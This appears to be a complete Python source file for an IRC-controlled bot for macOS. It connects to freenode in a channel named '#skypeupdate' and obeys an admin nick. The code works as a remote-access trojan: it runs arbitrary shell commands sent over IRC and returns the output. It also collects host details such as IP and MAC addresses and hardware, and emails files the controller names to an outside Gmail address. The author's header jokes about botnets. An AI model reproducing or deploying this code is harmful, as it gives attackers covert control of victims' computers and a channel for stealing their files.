# -*- coding: utf-8 -*-
# based on this awesome dude's code: chevloschelios (http://ubuntuforums.org/showthread.php?t=1493702)
# Nick Sweeting © 2013
# share and share alike blah blah blah but for godsakes dont credit me, i dont want to get arrested if you make a botnet using this (dont)

import socket
import getpass
import random
import signal
import os
import subprocess
from subprocess import Popen, PIPE, STDOUT
import time
from time import strftime, sleep

version = 1.0

def log(prefix, content=''):
   try:
      for line in content.split('\n'):
         print('[%s] %s%s' % (strftime("%Y-%m-%d %H:%M:%S"), prefix, line))
   except:
      print('[%s] %s%s' % (strftime("%Y-%m-%d %H:%M:%S"), prefix, content))

log("[*] IRC BOT v%s" % version)

############ Variables

server = 'irc.freenode.net'                                        # IRC server to connect to
port = 6667                                                        # you really shouldnt need these comments
channel = '#skypeupdate'                                                      # duh
admin = 'thesquash'                                                # the nick of the master of bots!

hostname = socket.gethostname()
local_user = getpass.getuser()

nick = '[%s|%s]' % (local_user, hostname)                                             # final format will be [username|hostname]rand, boy do i wish IRC allowed nicks with @ characters


helpmsg = 'Version: v%s\n\
Available Commands: \n\
 1. !quit          #-- shutdown the bot \n\
 2. !reload        #-- reconnect to IRC \n\
 3. !identify       #-- provide info on host system\n\
 4. email$         #-- send email to admin with attch listed after $\n\
 5. !help           #-- display this message\n\
 6. $<command>     #-- run <command> in shell and capture live output\n\
 7. !cancel        #-- stop grabbing running command output\n' % version

############ IRC functions

def line_split(seq, n):
   output = []
   if (seq.find('\n') == -1):
      output.append(seq)
   else:
      while (seq.find('\n') != -1):
         output.append(seq.split("\n", 1)[0])
         seq = seq.split("\n", 1)[1]
   splitout = []
   for line in output:
      while line:
         splitout.append(line[:n])
         line = line[n:]
   return splitout

def scan(match):                                                  # function to scan main channel messages for strings
   if data.find(channel) != -1 and not data.find(nick) != -1:     # checking to make sure its not a private message
      return data.find(match) != -1
   else:
      return False

def privscan(match):                                              # function to scan private messages to the bot for strings
   if data.find('PRIVMSG %s :%s' % (nick, match)) != -1:
      header = data.split("PRIVMSG")[0]
      return header.find(':%s!' % admin) != -1                    # checks to make sure private message is from admin

def handler(signum, frame):
   raise Exception("timedout")

def privmsg(msg=None, to=admin):                                  # function to send a private message to a user, defaults to master of bots!
   log('[+] Sent Data:')
   if (len(msg) > 480) or (msg.find('\n') != -1):
      log('[#] Starting multiline output.')
      msgs = line_split(msg, 480)
      total = len(msgs)
      for num, line in enumerate(msgs):
         log('[<]    PRIVMSG %s :[%s/%s] %s\r' % (to, num+1, total, line))
         irc.send ('PRIVMSG %s :[%s/%s] %s\r\n' % (to, num+1, total, line))
         sleep(1)
      log('[#] Finished multiline output.')  
   else:
      log('[<]    PRIVMSG %s :%s\r' % (to, msg))
      irc.send ('PRIVMSG %s :%s\r\n' % (to, msg))

def broadcast(msg):                                               # function to send a message to the main channel
   privmsg(msg, channel)

def do(cmd, timeout=600, verbose=False):
   out = ''
   signal.signal(signal.SIGALRM, handler)
   signal.alarm(timeout)
   try:
      p = subprocess.Popen([cmd],shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, executable='/bin/bash')
      log("[$]   Started.")
      run = 1
   except Exception as e:
      yield("Failed: %s" % e)
      out += "Failed: %s" % e
      run = 0
   signal.alarm(0)
   while(run):
      signal.signal(signal.SIGALRM, handler)
      signal.alarm(4)
      try:
         signal.signal(signal.SIGALRM, handler)
         signal.alarm(2)
         try:
            line = p.stdout.readline()
            if verbose: yield(line)
            else: yield(line.strip())
            out += line
         except:
            log('[#] Checking for input.')
         data = irc.recv ( 4096 )
         log('[+] Recieved:')
         log('[>]    ', data)
         if (data.find('!cancel') != -1):
            run = 0
            retcode = "Cancelled."
            yield("[X]: %s" % retcode)
            os.killpg(p.pid, signal.SIGTERM)
            break
         else:
            retcode = p.poll() #returns None while subprocess is running
      except Exception as e:
         retcode = p.poll() #returns None while subprocess is running
         log('[#] Done Checking.')
      signal.alarm(0)
      if (retcode is not None):
         line = p.stdout.read()
         if verbose: yield(line)
         out += line
         out += "[$] Exit Status: %s" % retcode
         if (retcode != 0):
            yield("[X]: %s" % retcode)
         elif (retcode == 0) and verbose:
            yield("[√]")
         run = 0
         break

def run(cmd, public=False):
   def respond(content):
      if public:
         broadcast(content)
      else:
         privmsg(content)

   out = ''
   cmd = cmd.strip()
   respond('[$] %s' % cmd)
   log("[+] Ran Command:")
   log("[$]   CMD: ", [cmd])
   for line in do(cmd, verbose=True):
      respond(line)
   log('[#] Done.')
   split = line_split(out, 480)
   ttl = len(split)
   for idx, line in enumerate(split):
      log("[>]   OUT [%s/%s]: " % (idx+1,ttl), line)
      log("\n")

def sendmail(to="nikisweeting+bot@gmail.com",subj='BOT: '+nick,msg="Test",attch=[]): # do not use attch.append() http://stackoverflow.com/a/113198/2156113
   err = """\n
      sudo mkdir -p /Library/Server/Mail/Data/spool\n
      sudo /usr/sbin/postfix set-permissions\n
      sudo /usr/sbin/postfix start
      """
   if len(attch) > 0:
      for attachment in attch:
         try:
            cmd = 'uuencode %s %s | mailx -s "%s" %s' % (attachment.strip(), attachment.strip(), subj, to)
            log('[+] Sending email...')
            log('[<]    ',cmd)
            sts = run(cmd, public=False)
            return "Sending email to %s. (subject: %s, attachments: %s\n[X]: %s)" % (to, subj, str(attch), str(sts))
         except Exception as error:
            return str(error)
   else:
      p = os.popen("/usr/sbin/sendmail -t", "w")
      p.write("To: %s" % to)
      p.write("Subject: %s" % subj)
      p.write("\n") # blank line separating headers from body
      p.write('%s\n' % msg)
      sts = p.close()
   if sts != None:
      return "Error: %s. Please fix Postfix with: %s" % (sts, err)
   else:
      return "Sent email to %s. (subject: %s, attachments: %s)" % (to, subj, str(attch))

def identify():
   log('[+] Running Identification Scripts...')
   import platform
   system = platform.mac_ver()[0]
   log('[>]    OS X:    ',system)
   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   s.connect(("8.8.8.8",80))
   local_ip = s.getsockname()[0]
   s.close()
   log('[>]    Local:   ',local_ip)
   import urllib2
   public_ip = urllib2.urlopen('http://checkip.dyndns.org:8245/').read().split(": ")[1].split("<")[0].strip()
   log('[>]    Public:  ',public_ip)
   import uuid
   mac_addr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
   log('[>]    MAC:     ',mac_addr)
   return "[v%s/x%s] %s@%s l: %s p: %s MAC: %s" % (version, system.strip(), local_user.strip(), hostname, local_ip, public_ip, mac_addr)

def priv_identify():
   log('[+] Running Identification Scripts...')
   privmsg('[+] Running Identification Scripts...')
   import platform
   system = platform.mac_ver()[0]
   log('[>]    OS X:    ',system)
   privmsg('[>]      OS X:    %s' % system)

   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   s.connect(("8.8.8.8",80))
   local_ip = s.getsockname()[0]
   s.close()
   log('[>]    Local:   ',local_ip)
   privmsg('[>]      Local:   %s' % local_ip)

   import urllib2
   public_ip = urllib2.urlopen('http://checkip.dyndns.org:8245/').read().split(": ")[1].split("<")[0].strip()
   log('[>]    Public:  ',public_ip)
   privmsg('[>]      Public:  %s' % public_ip)

   import uuid
   mac_addr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
   log('[>]    MAC:     ',mac_addr)
   privmsg('[>]      MAC:     %s' % mac_addr)

   cmd = "system_profiler SPPowerDataType | grep Connected"
   for line in do(cmd):
      log('[>]    Power:    ',line)
      privmsg('[>]      Power:    %s' % line)

   cmd = "uptime"
   for line in do(cmd):
      log('[>]    UP:    ',line)
      privmsg('[>]      Up:    %s' % line)

   cmd = "cd /Users/; du -s * 2>/dev/null | sort -nr | head -1 | awk  '{print $2}'"
   for line in do(cmd):
      log('[>]    User:    ',line)
      privmsg('[>]      User:    %s' % line)

   cmd = "system_profiler SPHardwareDataType"
   log('[>]    CMD:     ',cmd)
   p = subprocess.Popen([cmd],shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, executable='/bin/bash')
   hardware = p.stdout.read()
   log('[>]    Hardware.')
   privmsg(hardware)

   privmsg('[√] Done.')


############The beef of things
if __name__ == '__main__':
   if len(nick) > 15: nick = '[%s]' % (local_user[:13])
   last_ping = time.time()
   threshold = 5 * 60
   quit_status = False
   while not quit_status:
      timeout_count = 0
      last_data = data = ''
      log("[+] Connecting...")
      log("[<]    Nick:        ", nick)
      log("[<]    Server:      ", server+':'+str(port))
      log("[<]    Room:        ", channel)
      try:
         irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         irc.settimeout(60)
         irc.connect((server, port))
         recv = irc.recv ( 4096 )
         log("[+] Recieved:    ", recv+'\n')
         irc.send ('NICK %s\r\n' % nick )
         irc.send ('USER %s %s %s :%s\r\n' % (nick, nick, nick, nick))
         irc.send ('JOIN %s\r\n' % channel)
         broadcast('Bot v%s Running.' % version)
      except Exception as error:
         log('[*] Connection Failed: ')
         log('[X]    ',error)
         timeout_count = 50
         sleep(10)

      while not quit_status and (timeout_count < 50):
         if (last_data == data):
            timeout_count += 1
         try:
            data = irc.recv ( 4096 )
            log('[+] Recieved:')
            log('[>]    ', data)
         except socket.timeout:
            if (time.time() - last_ping) > threshold:
               log('[*] Disconnected.')
               timedout_count = 50
               break
            else:
               data = str(time.time())
               pass

         if data.find ('PING') != -1:                                     # im warning you, dont touch this bit
            irc.send ('PONG ' + data.split()[1] + '\r')
            last_ping = time.time()
            log('[+] Sent Data:')
            log('[<]    PONG ',data.split()[1])
            timeout_count = 0    

         elif data.find('ickname is already in use') != -1:
            nick += str(random.randint(1,200))
            if len(nick) > 15: nick = '[%s]%s' % (local_user[:11], random.randint(1,99))
            timeout_count = 50

         elif scan('!quit') or privscan('quit'):
            privmsg('Quitting.')
            irc.send ( 'QUIT\r\n' )
            quit_status = True

         elif scan('!reload') or privscan('reload'):
            privmsg('Reloading.')
            irc.send ( 'QUIT\r\n' )
            break

         elif scan('!identify'):
            broadcast(identify())

         elif privscan('identify'):
            priv_identify()

         elif privscan('help'):
            privmsg(helpmsg)

         elif scan('help'):
            broadcast(helpmsg)

         elif scan('email$'):
            attch = data.split("$")[1].split(',')
            to = "nikisweeting+bot@gmail.com"
            broadcast(sendmail(to.strip(),msg="whohooo",attch=attch))

         elif scan('$'):
            cmd = data.split("$")[1]
            run(cmd, public=True)

         elif privscan('$'):
            cmd = data.split("$")[1]
            run(cmd, public=False)

         last_data = data

   log("[*] EXIT")